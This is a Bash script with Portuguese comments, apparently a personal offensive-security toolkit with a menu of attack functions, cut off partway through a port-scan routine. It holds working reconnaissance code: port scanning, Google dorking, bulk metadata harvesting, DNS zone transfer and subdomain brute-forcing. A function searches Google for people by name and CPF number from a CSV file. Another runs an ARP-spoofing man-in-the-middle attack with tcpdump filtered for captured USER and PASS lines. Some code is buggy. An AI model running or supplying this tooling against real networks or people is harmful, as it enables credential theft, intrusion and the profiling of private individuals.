#!/bin/bash
#todo ADD CABEÇALHO
#todo: CONFIGURAR PROXY CHAINS AO INICIALIZAR O SCRIPT

######################## VARIAVEIS ########################
#
# Definição das cores
    BLACK="\e[30m"
    RED="\e[31m"
    GREEN="\e[32m"
    YELLOW="\e[33m"
    BLUE="\e[34m"
    MAGENTA="\e[35m"
    CYAN="\e[36m"
    WHITE="\e[37m"
    GRAY="\e[90m"
# Definição das cores de fundo
    BG_BLACK="\e[40m"
    BG_RED="\e[41m"
    #BG_GREEN="\e[42m"
    #BG_YELLOW="\e[43m"
    #BG_BLUE="\e[44m"
    #BG_MAGENTA="\e[45m"
    #BG_CYAN="\e[46m"
    #BG_WHITE="\e[47m"
# Define a cor default do terminal
    RESET="\e[0m"
#

######################## FUNÇÕES DE APOIO ########################
function desabilitado(){
    echo "" 
    echo -e "${RED} >>> FUNCAO DESABILITADA <<<  ${RESET}"
    echo "" && echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r && main_menu;
}
#
function msg_erro_root (){
    clear
    echo ""
    echo -e "${BG_BLACK}${RED} >>>  VOCE DEVE SER ROOT PARA EXECUTAR ESSE SCRIPT!${RESET}"
    echo""
    exit 1 
}
#
function msg_erro_arquivo (){
    clear
    echo ""        
    echo -e "${BG_BLACK}${RED} >>> ERRO!${RESET}" 
    echo ""        
    echo -e "${BG_BLACK}${RED}Uso: $0 ${RESET}"       
    exit 1  
}
# Define a função opcao_invalida
function opcao_invalida(){
    # Exibe uma mensagem de opção inválida em vermelho com fundo preto
    echo -e "${BG_RED}${BLACK} OPCAO INVALIDA!${RESET}${RED} Execute o script novamente e escolha uma opcao correta.${RESET}"
    # Exibe uma instrução para pressionar ENTER para continuar
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r # Aguarda o usuário pressionar ENTER
    main_menu; # Chama a função main_menu para exibir novamente o menu principal
}
# Define a função zero_sai_script
function zero_sai_script(){
    # Exibe uma mensagem para pressionar ENTER para continuar
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    # Lê a entrada do usuário e redireciona qualquer erro para /dev/null
    read -r 2> /dev/null
    exit 0 # Sai do script com status de saída 0 (sem erros)
}
# Define a função de pausa do script
function pausa_script(){
    # Mensagem para pressionar ENTER para continuar
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    main_menu;
}

######################## FUNÇÕES MAIN ########################
# Define a função texto_main_menu
function texto_main_menu(){
    clear # Limpa a tela do terminal
    # Exibe o cabeçalho do menu com o nome do script e do autor
    echo -e ""
    echo -e "${RED} ██████╗     ██████╗ ██╗    ██╗██╗         ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗${RESET}"
    echo -e "${RED}██╔═████╗   ██╔═████╗██║    ██║██║         ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝${RESET}"
    echo -e "${RED}██║██╔██║   ██║██╔██║██║ █╗ ██║██║         ███████╗██║     ██████╔╝██║██████╔╝   ██║   ${RESET}"
    echo -e "${RED}████╔╝██║   ████╔╝██║██║███╗██║██║         ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   ${RESET}"
    echo -e "${RED}╚██████╔╝██╗╚██████╔╝╚███╔███╔╝███████╗    ███████║╚██████╗██║  ██║██║██║        ██║   ${RESET}"
    echo -e "${RED} ╚═════╝ ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   ${RESET}"
    echo -e "${RED}                                                                                       ${RESET}"
    echo -e "${RED} v 0.9                                                                                 ${RESET}"   
    echo -e "${GRAY}+===================================== 0.0wL ========================================+${RESET}"
    echo -e "${GRAY}+                          Feito por Gress a.k.a R3v4N||0wL                          +${RESET}"
    echo -e "${GRAY}+====================================================================================+${RESET}"
    # Exibe as opções do menu numeradas e descritas
    echo -e "${MAGENTA} 1 - Portscan ${RESET}" 
    echo -e "${GRAY}${BG_BLACK} 2 - Parsing HTML ${RESET}" 
    echo -e "${GRAY}${BG_BLACK} 3 - Google Hacking ${RESET}" 
    echo -e "${GRAY}${BG_BLACK} 4 - Analise de metadados ${RESET}" 
    echo -e "${GRAY}${BG_BLACK} 5 - DNS ZT ${RESET}" 
    echo -e "${GRAY}${BG_BLACK} 6 - SubDomain TKOver ${RESET}" 
    echo -e "${GRAY}${BG_BLACK} 7 - DNS reverse ${RESET}" 
    echo -e "${GRAY}${BG_BLACK} 8 - DNS recon ${RESET}"
    echo -e "${GRAY}${BG_BLACK} 9 - OSINTool ${RESET}"
    echo -e "${MAGENTA} 10 - MiTM"
    echo -e "${GRAY}${BG_BLACK} 11 - Portscan (bash sockets) ${RESET}"
    echo -e "${MAGENTA} 12 - Comandos uteis na gerência de redes"
    echo -e "${MAGENTA} 13 - Exemplos do comando find"
    echo -e "${MAGENTA} 14 - Memento de troca de senha do root no Debian"
    echo -e "${GRAY}${BG_BLACK} 15 - Memento de troca de senha do root no Red Hat${RESET}"
    echo -e "${MAGENTA} 16 - Memento de uso do vim"
    echo -e "${GRAY}${BG_BLACK} 17 - Tecnicas de escape de rbash (funcao em teste) ${RESET}"
    echo -e "${MAGENTA} 18 - Ataques a Redes Sem Fio"
    echo -e "${MAGENTA} 19 - Memento de dicas p/ Windows"
    echo -e "${GRAY}${BG_BLACK} 20 - Cria scripts em .bat ou .ps1 ${RESET}"
    echo -e "${MAGENTA} 21 - Muda para o script do Sgt Domingues de Scanning"
    echo -e "${MAGENTA} 22 - NMAP Net Scan ${RESET}"
    echo -e "${GRAY}${BG_BLACK} 23 - xxxxx ${RESET}"
    echo -e "${GRAY}${BG_BLACK} 24 - xxiv_revshell_windows ${RESET}"
    echo -e "${GRAY}${BG_BLACK} 25 - xxv_rdp_windows ${RESET}"
    # Exibe instrução para sair do menu
    echo -e "${GRAY}+==============================================+${RESET}"
    echo -e " ${WHITE}Digite 0(zero) para sair${RESET}"
    echo -e "${GRAY}+==============================================+${RESET}"
    # Solicita ao usuário que digite o número da opção desejada
    echo -ne "${CYAN} Digite o nr da opc: ${RESET}"
    read -r OPCAO_MENU # Lê a entrada do usuário e armazena na variável OPCAO_MENU
}
# Define a função main_menu
function main_menu(){
    texto_main_menu;  # Chama a função texto_main_menu para exibir o menu
    case $OPCAO_MENU in
        0) zero_sai_script; 
            ;; # Sai do script
        1) i_portscan; 
            ;; # Portscan
        2) ii_parsing_html;
            ;; # Parsing HTML
        3) desabilitado; #* DESABILITADO PARA PROVA -> iii_google_hacking 
            ;; # Google Hacking
        4) desabilitado; #* DESABILITADO PARA PROVA -> iv_analise_metadados;
            ;; # Analise de Metadados Direto da Internet
        5) desabilitado; #* DESABILITADO PARA PROVA -> v_dns_zt;
            ;; # DNS Zone Transfer
        6) desabilitado; #* DESABILITADO PARA PROVA -> vi_Subdomain_takeover;
            ;; # Subdomain takeover
        7) desabilitado; #! DESABILITADO PARA MANUTENÇÃO -> vii_rev_dns #XXX
            ;;
        8) desabilitado; #* DESABILITADO PARA PROVA -> viii_recon_dns;
            ;; # DNS recon
        9) desabilitado; #! NECESSITA REFATORAÇÃO PARA TRAZER MAIS OBJETIVIDADE AO CÓDIGO -> ix_consulta_geral_google
            ;; #TODO ADC COMENTÁRIO
        10) x_mitm; #! #TODO: REALIZAR TESTES PARA VERIFICAR SE REALMENTE ESTÁ FUNCIONAL
            ;; # MiTM (gciber)
        11) desabilitado; #! DESABILITADO PARA MANUTENÇÃO -> xi_portscan_bashsocket; #TODO: REALIZAR TESTES PARA VERIFICAR SE REALMENTE ESTÁ FUNCIONAL
            ;; # portscan usando bashsocket
        12) xii_comandos_uteis_linux;
            ;; # Comandos úteis na gerência de redes
        13) xiii_exemplos_find;
            ;; # Comando find e seus exemplos
        14) xiv_debian_memento_troca_senha_root;
            ;; # Memento de troca de senha do root no debian
        15) desabilitado; #! DESABILITADO PARA MANUTENÇÃO -> xv_redhat_memento_troca_senha_root; #TODO: NECESSITA DE MANUTENÇÃO E REFATORAÇÃO APÓS SALVAR O CÓDIGO ERRADO E NÃO HAVER PERCEBIDO
            ;; # Memento de troca de senha do root no redhat
        16) xvi_vim_memento;
            ;; # Memento de uso do VIM
        17) desabilitado; #! DESABILITADO PARA MANUTENÇÃO -> xvii_tec_esc_rbash; #TODO: NECESSITA DE MANUTENÇÃO E REFATORAÇÃO PARA FICAR FUNCIONAL
            ;; # Técnicas de escape de Shell restrito usando o VIM
        18) xviii_wifi_atk;
            ;; # Ataque a Redes Sem Fio
        19) xix_cmd_basicos_windows; #* #TODO ADC COMENTÁRIO DESCREVENDO A FUNÇÃO
            ;; 
        20) desabilitado; #! DESABILITADO PARA MANUTENÇÃO -> xx_cria_script_windows; #TODO: NECESSITA DE REFATORAÇÃO E MELHORIAS PARA ADC FUNÇÕES DE REVSHELL #TODO ADC COMENTÁRIO DESCREVENDO A FUNÇÃO
            ;; 
        21) xxi_script_sgt_domingues; #* #TODO ADC COMENTÁRIO DESCREVENDO A FUNÇÃO
            ;; 
        22) xxii_nmap_descoberta_de_rede; #* #TODO ADC COMENTÁRIO DESCREVENDO A FUNÇÃO
            ;;
        24) desabilitado; #! DESABILITADO PARA MANUTENÇÃO -> xxiv_revshell_windows; #* #TODO ADC COMENTÁRIO DESCREVENDO A FUNÇÃO
            ;;
        25) desabilitado; #! DESABILITADO PARA MANUTENÇÃO -> xxv_rdp_windows; #* #TODO ADC COMENTÁRIO DESCREVENDO A FUNÇÃO
            ;;
        *) opcao_invalida;
            ;; # Informa que a opcao foi invalida 
    esac
}
#============================================================

######################## FUNÇÕES DO MENU ########################
# Define a função i_portscan
function i_portscan(){
    clear;
    echo -e "${MAGENTA} 1 - Portscan usando netcat"
    echo -e "${GRAY}+======================================================================+${RESET}"
    echo -e "${GRAY}Esse port scan verifica algumas portas comuns em todos os hosts da rede"
    echo -e "${GRAY}+======================================================================+${RESET}"
    # Verifica se o ipcalc está instalado
    if ! command -v ipcalc >/dev/null 2>&1; then
        echo "O utilitário ipcalc não está instalado. Tentando instalar..."
        # Detecta o gerenciador de pacotes e instala o ipcalc
        if command -v apt-get >/dev/null 2>&1; then
            sudo apt-get update
            sudo apt-get install -y ipcalc
        elif command -v yum >/dev/null 2>&1; then
            sudo yum install -y ipcalc
        elif command -v dnf >/dev/null 2>&1; then
            sudo dnf install -y ipcalc
        elif command -v pacman >/dev/null 2>&1; then
            sudo pacman -Sy ipcalc
        else
            echo "Não foi possível detectar o gerenciador de pacotes. Por favor, instale o ipcalc manualmente."
            exit 1
        fi
    fi

    # Adiciona o trap para capturar Ctrl+C (opcional)
    trap 'echo -e "\nScript interrompido pelo usuário."; exit 1' SIGINT

    # Lista de portas a serem verificadas
    LISTA_PORTAS="80 23 443 21 22 25 3389 110 445 139 143 53 135 3306 8080 1723 111 995 993 5900"
    
    # Solicita ao usuário que digite o IP com o CIDR de rede
    echo -n "Digite o IP com o CIDR de rede (ex: 192.168.9.1/24): "
    read -r MASCARA
    
    # Verifica se a máscara de rede é válida
    if ! ipcalc -n -b -m "$MASCARA" > /dev/null 2>&1; then
        echo "Máscara de rede inválida."
        exit 1 # Sai do script com status de saída 1 (erro)
        main_menu; # Retorna ao menu principal
    fi
    
    # Obtém o prefixo da rede a partir da máscara
    REDE=$(ipcalc -n -b "$MASCARA" | awk '/Network/ {print $2}' | awk -F. '{print $1"."$2"."$3}')
    
    # Loop para verificar a porta em cada host da rede
    for HOST in $(seq 1 254); do
        IP="$REDE.$HOST"
        for PORTA in $LISTA_PORTAS; do
            # Verifica se a porta está aberta no host
            nc -z -w 1 "$IP" "$PORTA" 2>/dev/null
            if [ $? -eq 0 ]; then
                echo "$IP com a porta $PORTA aberta"
            fi
        done    
    done
    
    # Mensagem de conclusão da verificação
    echo "Verificação terminada para $MASCARA"
    # Solicita ao usuário para pressionar ENTER para continuar
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r
    main_menu; # Retorna ao menu principal
}


# Define a função ii_parsing_html
function ii_parsing_html(){
    
    # parsing_html - Script para analisar subdomínios e informações WHOIS de um site ou lista de sites.
    #
    # Descrição:
    # Este script realiza as seguintes operações:
    # 1. Extrai subdomínios de uma página HTML.
    # 2. Obtém os endereços IP associados a cada subdomínio.
    # 3. Obtém informações WHOIS para cada domínio.
    # 4. Gera um relatório com os resultados.
    #
    # Dependências:
    # - curl: Para fazer solicitações HTTP.
    # - dig: Para obter endereços IP de subdomínios.
    # - whois: Para obter informações WHOIS de domínios.
    # - nslookup:
    #
    # Autor: R3v4N (w/GPT)
    # Data de Criação: 2024-15-01
    # Última Atualização: 2024-15-01
    # Versão: 1
    #
    # Notas:
    # - Certifique-se de ter as dependências instaladas antes de executar o script.
    # - O relatório é salvo em um arquivo com o formato "resultado_<site ou lista>.txt".
    #
    
    # Solicita ao usuário que digite (ou cole) a url do site desejado
    echo "Digite (ou cole) a url do site desejado"
    read -r SITE
    # Armazena a data e hora atual e o nome do arquivo de saída
    data_hora=$(date +"%Y-%m-%d %H:%M:%S")
    saida="resultado_$data_hora.txt"
    
    # Função para imprimir em cores
    print_color() {
        cor=$1
        texto=$2
        echo -e "\e[0;${cor}m${texto}\e[0m"
    }
    
    # Função para extrair subdomínios de uma página HTML
    extrair_subdominios() {
        site=$1
        # Usa curl para obter o conteúdo HTML, grep para extrair URLs, awk para obter o subdomínio e sort para remover duplicatas
        curl -s "$site" | grep -Eo '(http|https)://[^/"]+' | awk -F[/:] '{print $4}' | sort -u
    }
    
    # Função para obter os endereços IP de um subdomínio
    obter_endereco_ip() {
        subdominio=$1
        # Usa host para obter o endereço IP e grep para extrair o primeiro IP encontrado
        endereco_ip=$(host "$subdominio" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n 1)
        echo "$endereco_ip:$subdominio"
    }
    
    # Função para obter informações do WHOIS para um domínio
    obter_info_whois() {
        dominio=$1
        # Usa whois para obter informações WHOIS e grep para filtrar linhas indesejadas
        whois "$dominio" | grep -vE "^\s*(%|\*|;|$|>>>|NOTICE|TERMS|by|to)" | grep -E ':|No match|^$'
    }
    
    # Função para obter informações do DNS para um domínio
    obter_info_dns() {
        dominio=$1
        # Usa nslookup para obter informações DNS e awk para extrair endereços IP
        nslookup "$dominio" 2>/dev/null | grep "Address" | awk '{print $2}' | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/, /g'
    }
    
    # Verifica se a entrada é um arquivo ou um site
    #if [ -f "$entrada" ]; then
    #        sites=("$(cat "$entrada")")
    #    else
    #        sites=("$entrada")
    #fi
    
    # Adiciona a data e hora no início do arquivo de saída
    echo -e "Relatório gerado em: $data_hora\n" > "$saida"
    
    # Loop principal para cada site
    for site in "${sites[@]}"; do
        print_color 33 "Analisando subdomínios para: $SITE"
        
        subdominios=("$(extrair_subdominios "$SITE")")
        
        # Verifica se há subdomínios
        if [ ${#subdominios[@]} -eq 0 ]; then
            print_color 31 "Nenhum subdomínio encontrado para: $SITE"
            echo "Nenhum subdomínio encontrado para: $SITE" >> "$saida"
        else
            print_color 32 "Subdomínios encontrados"
            for subdominio in "${subdominios[@]}"; do
                print_color 36 "$subdominio"
                resultado=$(obter_endereco_ip "$subdominio")
                echo "$resultado" >> "$saida"
                
                # Adiciona informações do WHOIS
                print_color 34 "Informações WHOIS para $subdominio"
                obter_info_whois "$subdominio" >> "$saida"
                
                # Adiciona informações do DNS Lookup
                print_color 34 "Informações DNS Lookup para $subdominio"
                obter_info_dns "$subdominio" >> "$saida"
                
                echo -e "\n" >> "$saida"
            done
        fi
    done
    
    print_color 32 "Análise concluída. Resultados salvos em: $saida"
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    main_menu;
}

# Define a função iii_google_hacking
function iii_google_hacking(){  
    SEARCH="firefox"

    # Define a função menu_google_hacking para solicitar ao usuário o nome do alvo a ser pesquisado
    function menu_google_hacking(){
        echo "Digite o nome do alvo a ser pesquisado:"
        read -r ALVO
    }

    #ALVO_TRATADO="\"$ALVO\""

    # Define a função pesquisaGeral para realizar pesquisas gerais utilizando o navegador especificado
    function pesquisaGeral() {
        echo "Verificando IP"
        $SEARCH "https://dnsleaktest.com" & # Abre uma página para verificar o IP
        sleep 3
        echo "Pesquisando no WEBMII server"
        $SEARCH "https://webmii.com/people?n=$ALVO" 2> /dev/null # Pesquisa no WEBMII server
        esperarEnter
        echo "Pesquisando em todo Google"
        $SEARCH "https://www.google.com/search?q=intext:$ALVO" 2> /dev/null # Pesquisa no Google
        esperarEnter
    }

    # Define a função pesquisarSite para realizar pesquisa em um site específico utilizando o navegador especificado
    function pesquisarSite() {
        local site="$1"
        local dominio="$2"
        echo "Pesquisando em $site"
        $SEARCH "https://www.google.com/search?q=inurl:$dominio+intext:$ALVO" 2> /dev/null # Pesquisa em um site específico
        esperarEnter
    }

    # Define a função pesquisaArquivo para realizar pesquisa por tipo de arquivo utilizando o navegador especificado
    function pesquisaArquivo() {
        local tipo="$1"
        local extensao="$2"
        echo "Pesquisando arquivo tipo: $tipo"
        $SEARCH "https://www.google.com/search?q=filetype:$extensao+intext:$ALVO" 2> /dev/null # Pesquisa por tipo de arquivo
        esperarEnter
    }

    # Define a função esperarEnter para aguardar o usuário pressionar Enter para continuar
    function esperarEnter() {
        read -r "Pressione Enter para continuar..."
    }

    # Chama a função menu_google_hacking para solicitar o nome do alvo
    menu_google_hacking
    # Realiza a pesquisa geral
    pesquisaGeral
    
    # Define uma lista de tipos de arquivo e suas extensões correspondentes
    tipos=("PDF" "ppt" "Doc" "Docx" "xls" "xlsx" "ods" "odt" "TXT" "PHP" "XML" "JSON" "PNG" "SQLS" "SQL")
    extensoes=("pdf" "ppt" "doc" "docx" "xls" "xlsx" "ods" "odt" "txt" "php" "xml" "json" "png" "sqls" "sql")
    
    # Realiza a pesquisa para cada tipo de arquivo na lista
    for ((i=0; i<${#tipos[@]}; i++)); do
        pesquisaArquivo "${tipos[i]}" "${extensoes[i]}"
    done
    
    # Define uma lista de sites para pesquisa e seus domínios correspondentes
    sites=( "Governo" "Pastebin" "Trello" "Github" "LinkedIn" "Facebook" "Twitter" "Instagram" "TikTok" "youtube" "Medium" "Stack Overflow" "Quora" "Wikipedia")
    dominios=( ".gov.br" "pastebin.com" "trello.com" "github.com" "linkedin.com" "facebook.com" "twitter.com" "instagram.com" "tikTok.com" "youtube.com" "medium.com" "stackoverflow.com" "quora.com" "Wikipedia.org")
    
    # Realiza a pesquisa para cada site na lista
    for ((i=0; i<${#sites[@]}; i++)); do
        pesquisarSite "${sites[i]}" "${dominios[i]}"
    done

    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    main_menu; # Retorna ao menu principal
}
# Define a função iv_analise_metadados
function iv_analise_metadados(){
    # Comando de pesquisa para analisar metadados
    SEARCH="lynx -dump -hiddenlinks=merge -force_html"

    # Define a função menu_analise_metadados para solicitar ao usuário as informações necessárias
    function menu_analise_metadados(){
        echo -n "Digite a extensao da URL onde desejar buscar (Ex:.gov.br): "
        read -r SITE
        echo -n "Digite a extensao do arquivo que desejar buscar (Ex:.pdf): "
        read -r FILE
        echo -n "[opcional] Digite alguma palavra chave para ajudar na busca.(Ex:vacina): "
        read -r KEYWORD
    }

    # Verifica se a palavra-chave está vazia e define a função de pesquisa de acordo
    if [ -z "$KEYWORD" ]; then
        function search(){
            echo "Procurando arquivos $FILE nas URLs com $SITE"
            $SEARCH "https://www.google.com/search?q=inurl:$SITE+filetype:$FILE" | grep -i '\.pdf' | cut -d '=' -f2 | grep -v 'x-raw-image' | sed 's/...$//' > "$(date +%d%H%M%b%Y)-UTC_${SITE}_${FILE}_filtered.txt"
            download "$(date +%d%H%M%b%Y)-UTC_${SITE}_${FILE}_filtered.txt"
        }
    else
        function search(){
            echo "Procurando arquivos $FILE nas URLs com $SITE e contendo $KEYWORD no corpo"
            $SEARCH "https://www.google.com/search?q=inurl:$SITE+filetype:$FILE+intext:$KEYWORD" | grep -i '\.pdf' | cut -d '=' -f2 | grep -v 'x-raw-image' | sed 's/...$//' > "$(date +%d%H%M%b%Y)-UTC_${SITE}_${KEYWORD}_${FILE}_filtered.txt"
            download "$(date +%d%H%M%b%Y)-UTC_${SITE}_${KEYWORD}_${FILE}_filtered.txt"
        }
    fi 

    # Define a função download para baixar os arquivos encontrados
    function download(){
        FILE="$1"
        FOLDER="${SITE}_$(date +%d%H%M%b%Y)-UTC"
        mkdir -p "$FOLDER"
        while IFS= read -r LINE; do
            wget -P "$FOLDER" "$LINE"
        done < "$FILE"
        rm -rfv ./*_filtered.txt
        readMetadate
    }

    # Define a função readMetadate para ler os metadados dos arquivos baixados
    function readMetadate(){
        "cd $FOLDER"
        exiftool ./*
    }

    # Chama a função menu_analise_metadados para solicitar as informações necessárias ao usuário
    menu_analise_metadados
    # Realiza a pesquisa
    search

    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    main_menu; # Retorna ao menu principal
}
# Define a função v_dns_zt para realizar uma transferência de zona DNS
function v_dns_zt(){
    echo "DNS Zone Transfer"
    echo "Digite a URL do alvo"
    read -r TARGET
    
    # Obter servidores de nomes para o domínio especificado
    NS_SERVERS=$(host -t ns "$TARGET" | awk '{print $4}')
    
    # Iterar sobre os servidores de nomes e listar os registros de zona de autoridade
    for SERVER in $NS_SERVERS; do
        host -l -a "$TARGET" "$SERVER"
    done
    
    # Aguarda o usuário pressionar Enter para continuar
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    
    main_menu; # Retorna ao menu principal
}
# Define a função vi_Subdomain_takeover para realizar um ataque de Subdomain Takeover
function vi_Subdomain_takeover(){
    # Solicita ao usuário o host para o ataque
    echo "Digite o host para o ataque de Subdomain takeover"
    read -r HOST
    
    # Solicita ao usuário o arquivo contendo os domínios a serem testados
    echo "Aponte para o arquivo com os domínios a serem testados."
    read -r FILE
    
    # Define o comando a ser usado para verificar os CNAME dos subdomínios
    COMMAND="host -t cname"
    
    # Itera sobre cada palavra no arquivo de domínios e executa o comando de verificação
    for WORD in $($FILE); do
        $COMMAND "$WORD"."$HOST" | grep "alias for"
    done
    
    # Aguarda o usuário pressionar Enter para continuar
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    
    main_menu; # Retorna ao menu principal
}
# Define a função vii_rev_dns para realizar uma pesquisa de DNS reverso
function vii_rev_dns(){
    echo "Dns Reverse"
    
    # Solicita ao usuário o endereço para a pesquisa de DNS reverso
    echo "Insira o endereço para o DNS REVERSE"
    read -r ADDRESS
    
    # Solicita ao usuário o início do intervalo de endereços IP
    echo "Digite o início do intervalo de endereços IP"
    read -r START
    
    # Solicita ao usuário o fim do intervalo de endereços IP
    echo "Digite o fim do intervalo de endereços IP"
    read -r END
    
    # Define o nome do arquivo de saída
    OUTPUT="$ADDRESS.$START-$END.txt"
    
    # Remove o arquivo de saída se existir e cria um novo
    rm -rf "$OUTPUT"
    touch "$OUTPUT"
    
    # Itera sobre os endereços IP no intervalo especificado e realiza a pesquisa de DNS reverso
    for RANGE in $(seq "$START" "$END"); do
        # Usa o comando host para obter o registro PTR e extrai o nome do host
        host -t ptr "$ADDRESS"."$RANGE" | cut -d ' ' -f5 | grep -v '.ip-' >> "$OUTPUT"
    done
    
    # Exibe o conteúdo do arquivo de saída
    cat "$OUTPUT"
    
    # Aguarda o usuário pressionar Enter para continuar
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    
    main_menu; # Retorna ao menu principal
}
# Define a função viii_recon_dns para realizar uma reconhecimento de DNS
function viii_recon_dns(){
    # Conta o total de linhas no arquivo de lista de subdomínios
    TOTAL_LINHAS=$(wc -l /usr/share/wordlists/amass/sorted_knock_dnsrecon_fierce_recon-ng.txt|awk '{print $1}')
    
    echo "DNS recon"
    
    # Solicita ao usuário o endereço para o DNS RECON
    echo "Insira o endereço para o DNS RECON (EX: businesscorp.com.br)"
    read -r DOMAIN
    
    # Inicializa a contagem de linha
    linha=0
    
    # Itera sobre cada subdomínio na lista de subdomínios
    # shellcheck disable=SC2013
    for SUBDOMAIN in $(cat /usr/share/wordlists/amass/sorted_knock_dnsrecon_fierce_recon-ng.txt); do
        # shellcheck disable=SC2219
        let linha++ # Incrementa o contador de linha
        
        # Realiza uma pesquisa de DNS para o subdomínio atual e salva no arquivo dns_recon_$DOMAIN.txt
        host "$SUBDOMAIN"."$DOMAIN" >> dns_recon_"$DOMAIN".txt
        
        # Exibe o progresso da pesquisa
        echo "--------PESQUISANDO---------> $linha/$TOTAL_LINHAS"
    done 
    
    # Aguarda o usuário pressionar Enter para continuar
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    
    main_menu; # Retorna ao menu principal
}
# Define a função ix_consulta_geral_google para realizar uma consulta geral no Google
function ix_consulta_geral_google(){
    echo "Consulta Geral Google" # Exibe mensagem indicando o início da consulta
    
    # Define as variáveis
    #FIREFOX_SEARCH="firefox &"
    LYNX_SEARCH="lynx -dump -hiddenlinks=merge -force_html"
    LISTA=./amanda2csv.csv
    
    # Define a função para aguardar a entrada do usuário
    function esperarEnter() {
        read -r "Pressione Enter para continuar..."
    }
    
    # Define a função para realizar a consulta geral no Google
    function consulta_geral_google (){
        # Itera sobre cada linha no arquivo de lista de consultas
        while IFS= read -r LINHA; do
            local NOME
            NOME="$(echo "$LINHA" |awk -F, '{print $1}')" # Extrai o nome da linha
            local CPF
            CPF="$(echo "$LINHA" |awk -F, '{print $2}')"   # Extrai o CPF da linha
            
            # Exibe a mensagem indicando a pesquisa atual
            echo "==="
            echo "Pesquisando:""$NOME"+"$CPF"
            
            # Realiza a pesquisa no Google usando lynx e filtra os resultados
            $LYNX_SEARCH "https://www.google.com/search?q=intext:$NOME+intext:$CPF" | grep -i '\.pdf' | cut -d '=' -f2 | grep -v 'x-raw-image' | sed 's/...$//' | grep -E -i "(HTTPS|HTTP)"
            
            esperarEnter # Aguarda o usuário pressionar Enter para continuar com a próxima pesquisa
        done < "$LISTA" # Redireciona o arquivo de lista de consultas para a entrada do loop
        echo "============ fim da consulta ===========" # Indica o fim da consulta
    }
    
    # Chama a função para realizar a consulta geral no Google
    consulta_geral_google
    
    # Aguarda o usuário pressionar Enter para continuar
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    
    main_menu; # Retorna ao menu principal
}
# Define a função x_mitm para realizar um ataque de Man-in-the-Middle (MiTM)
function x_mitm(){
    ########### VARIAVEIS ##############
    # Obtém o nome da interface de rede que começa com 'tap'.
    INTERFACE=$(ip -br a | grep tap | head -n 1 | cut -d ' ' -f1)
    # Calcula a rede da interface obtida anteriormente.
    REDE=$(ipcalc "$(ip -br a | grep tap | head -n 1 | awk '{print $3}'|awk -F '/' '{print $1}')"|grep -F "Network:"|awk '{print $2}')
    
    ########### FUNÇÕES ##############
    # Limpa a tela e exibe informações sobre a interface e a rede de ataque.
    function mensagem_inicial (){
        clear
        echo "============= 0.0wL ============="
        echo "INTERFACE DO ATAQUE: $INTERFACE"
        echo "REDE DO ATAQUE: $REDE"
        echo "================================="
    }
    
    # Habilita o roteamento de pacotes no sistema.
    function habilitar_roteamento_pc (){
        echo 1 > /proc/sys/net/ipv4/ip_forward
        echo "================================="
        echo "ROTEAMENTO DE PACOTES HABILITADO"
        echo "================================="
    }
    
    # Configura o ambiente para spoofing e captura de pacotes.
    function estrutura_mitm (){
        macchanger -r "$INTERFACE";  # Altera o endereço MAC da interface para fins de spoofing
        #wireshark -i "$INTERFACE" -k >/dev/null 2>&1 & # Inicia o Wireshark para captura de pacotes em segundo plano #TODO:REATIVAR WIRESHARK 
        tilix --action=app-new-window --command="netdiscover -i $INTERFACE -r $REDE" & \  # Inicia o Netdiscover em uma nova sessão do Tilix #FIXME: /media/kali/r3v4n64/CyberVault/EXTRAS/SCRIPTS/0wL_Cyber.sh: line 628:  : command not found
        sleep 10  # Espera por 10 segundos
        echo -n "Digite o IP do ALV01: "  # Solicita o IP do alvo 1
        read -r ALV01  # Lê o IP do alvo 1
        echo -n "Digite o IP do ALV02: "  # Solicita o IP do alvo 2
        read -r ALV02  # Lê o IP do alvo 2
        tilix --action=app-new-session --command="arpspoof -i $INTERFACE -t $ALV01 -r $ALV02" & \  # Inicia o Arpspoof em uma nova sessão do Tilix #FIXME: /media/kali/r3v4n64/CyberVault/EXTRAS/SCRIPTS/0wL_Cyber.sh: line 634:  : command not found
        #clear  # Limpa a tela
        #open a new konsole session with arpspoof
        tcpdump -i "$INTERFACE" -t host "$ALV01" and host "$ALV02" | grep -E '\[P.\]' | grep -E 'PASS|USER|html|GET|pdf|jpeg|jpg|png|txt' | tee capturas.txt #todo: add mais ext aos filtros com regex '  # Inicia o Tcpdump para captura de pacotes entre os alvos
    }
    
    # Função principal para execução do ataque MiTM
    function main_mitm (){
        mensagem_inicial;  # Chama a função mensagem_inicial.'
        habilitar_roteamento_pc;  # Chama a função habilitar_roteamento_pc.'
        estrutura_mitm;  # Chama a função estrutura_mitm.'
        echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
        read -r 2> /dev/null
        main_menu
    }
    
    ########### MAIN ##############
    main_mitm;

}
# Portscan usando bashsocket
function xi_portscan_bashsocket(){
    # Script retirado do livro Cybersecurity Ops with bash e modificado para as minhas necessidades
    #
    # Descrição:
    # Executa um portscan em um determinado host
    #

    echo -n "Insira o alvo para o portscan (ex: 192.168.9.5): "
    read -r host_alvo
    printf 'Alvo -> %s - Porta(s): ' "$host_alvo"  # Imprime o prefixo antes do loop

    # Usar uma variável para armazenar as portas encontradas
    portas_encontradas=""

    # Loop para verificar portas abertas
